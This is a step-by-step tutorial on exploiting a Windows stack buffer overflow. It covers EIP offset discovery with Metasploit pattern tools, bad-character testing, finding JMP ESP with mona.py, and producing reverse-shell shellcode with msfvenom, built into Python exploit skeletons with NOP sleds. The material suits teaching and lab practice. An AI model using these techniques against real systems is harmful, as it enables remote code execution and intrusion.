# BOF Exploitation


## 1. Replicating the crash

Once the vulnerability is discovered, we need to find the way to control the EIP. In this moment, the objective is to rewrite the fuzzer script that crashes the app with a fixed length (without loop). Let's say 800 bytes.

_____

## 2. Controlling EIP

The crucial step here is to find which part of our buffer (800 bytes) is landing in the EIP register. To do this, there are two common ways to do it:

#### 2.1 Binary Tree Analysis (slowest)

This method requires sending the buffer with half of it being A's and the other half being B's (AAAAA...BBBBB). If the EIP register is overwritten by B's, we know the EIP is inside the second half. We now take this half and split in two parts, left part being B's and the right part being C's. The process continues until we find the exact four bytes that overwrite EIP.

#### 2.2 Patterns (faster)

The point here is to create a long string that consists of non-repeated 4 bytes as the fuzzing data. Once the EIP is overwritten with these 4 bytes, we can identify where exactly happened using various tools.

```bash
#Creating the string with a length of 800 bytes:
msf-pattern_create -l 800
```

At this point, copy the value of the EIP register and execute the following command to extract the exact offset:

```bash
#-l is the length of the original string:
msf-pattern_offset -l 800 -q 42306142
```

Once identified the offset, we can execute a test by using A's for the offset, B's for 4 EIP bytes and C's for the rest. If the EIP is 0x42424242 we are good!

```python
filler = "A" * 780
eip = "B" * 4
buffer = "C" * 16
```
_____

## 2.3 Locating space for Shellcode

Looking at the last crash we made we can see that the ESP register points to our buffer of C's (but 4 bytes after).

Knowing that shellcodes have a size of 350-400 bytes approximately, we can increment our script with an additional 700 bytes to see if it allows enough space for our shellcode without breaking the buffer overflow:

```python
filler = "A" * 780
eip = "B" * 4
buffer = "C" * 4
shellcode = "D" * 700
```

Once the script is executed again, the ESP register should point to our shellcode placeholder (full of D's).

**Note that ESP address changes everytime we run the exploit.**

_____

## 2.4 Checking for Bad Characters

> A bad character is simply a list of unwanted characters that can break the shell codes. There is no universal set of bad characters, as we would probably be beginning to understand, but depending on the application and the developer logic there is a different set of bad characters for every program that we would encounter. Therefore, we will have to find out the bad characters in every application before writing the shell code.

Some of the very common bad characters are:

```
0x00 for NULL
0x0A for Line Feed
0x0D for Carriage Return
0xFF for Form Feed
```

A way to check which characters are bad for a particular exploit is to send all possible characters, from 0x00 to 0xFF, as part of the buffer and see how the application deals with it.

In order to test in our example, we can add them as our shellcode placeholder:

```python
filler = "A" * 780
eip = "B" * 4
buffer = "C" * 4
shellcode = "\x00\x01\x02\x03.....\xff"
```

After executing the script we need to right-click on the ESP register and click "Follow in Dump" and see which character is truncating our shellcode. We note that, delete it from the shellcode, and continue until the last character (xff).

_____

## 2.5 Redirecting the Execution Flow

We know that our shellcode is placed at the address pointed in the ESP register. Now we need a way to get that code executed. One way is to leverage a JMP ESP (which will "jump" into the address pointed in ESP).

We can find this JMP ESP instruction in the many Windows libraries, but needs some criteria:

1. Adresses used in the library must be static.
2. The address of the instruction must not contain bad characters.

### Using mona.py

To begin with our return address search we will use mona.py. In order to request information from all the DLLs or modules loaded by the application into the proccess memory, execute the following syntax in the bottom of Inmunity Debugger:


```
!mona modules
```

In this screen we should find a dll or module that have the flags from SEH, ASLR and NXCompact on false (those are for security purposes) and remember that **the address must not have bad chars.**

Once found, we need to find the address of a JMP ESP instruction within this module. To do this, first translate the instruction (JMP ESP) to opcode (hexadecimal):

```bash
#Using metasploit:
msf-nasm_shell
jmp esp #In this case: ffe4
#Take the Hexadecimal values
```

Now, search for it inside the module with mona:

```bash
#Change "\xff\xe4" with the correct opcode:
!mona find -s "\xff\xe4" -m "$MODULENAME"
```

Now mona should show the address fo the JMP ESP instruction. Remember that **the address must not have bad chars.**

If the address is ok and we redirect the EIP register to this address at the crash, the JMP ESP instruction will be executed and the program will execute our shellcode.

To do this, add the address in little endian format to our eip script:

```python
filler = "A" * 780
eip = "\x00\x00\x00\x00" #Change this for the little-endian values
buffer = "C" * 4
shellcode = "D" * 700
```

_____

## 2.6 Generating Shellcode

We can use metasploit msfvenom in order to generate our shellcode.

```bash
#List all types of shellcode:
msfvenom -l payloads
#Generate reverse TCP shell using C format (-f):
msfvenom -p windows/shell_reverse_tcp LHOST=$IPADDRESS LPORT=$PORT -f c
```

Note that the shellcode provided by msfvenom may contain bad chars. If this is the case, we need to encode it by using the following technique:

```bash
#-e: Specify the encode to use.
#-b: Specify the bad characters we don't want.
msfvenom -p windows/shell_reverse_tcp LHOST=$IPADDRESS LPORT=$PORT -f c -e x86/shikata_ga_nai -b "\x00\x00\x00\x00"
```

However, if the application contain lots of badchars, we just leave msfvenom without specifying any encode (-e) and it will itself generate one with a valid encoder.

In case the app supports threaded mode, we can use the EXITFUNC flag of msfvenom in order to prevent the crash of the application once the reverse shell is closed:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$IPADDRESS LPORT=$PORT EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x00\x00\x00"
```
_____

## Getting a reverse shell

In order to get a reverse shell, we only need to change our buffer of D's with the shellcode provided by msfvenom:

```python
filler = "A" * 780
eip = "\x00\x00\x00\x00" #Change this for the little-endian values
buffer = "C" * 4
shellcode = "\x00\x00.....\x00" #Change this wtih the correct shellcode
```

However, if we used some encoding technique in order to remove bad chars, we need to **add some NOPs (\x90)** before the shellcode because the process of decoding the shellcode will override a few bytes from the top of the stack (which is where our shellcode is placed). The final form of the script will be:

```python
filler = "A" * 780
eip = "\x00\x00\x00\x00" #Change this for the little-endian values
buffer = "C" * 4
nops = "\x90" * 10
shellcode = "\x00\x00.....\x00" #Change this wtih the correct encoded shellcode.
```
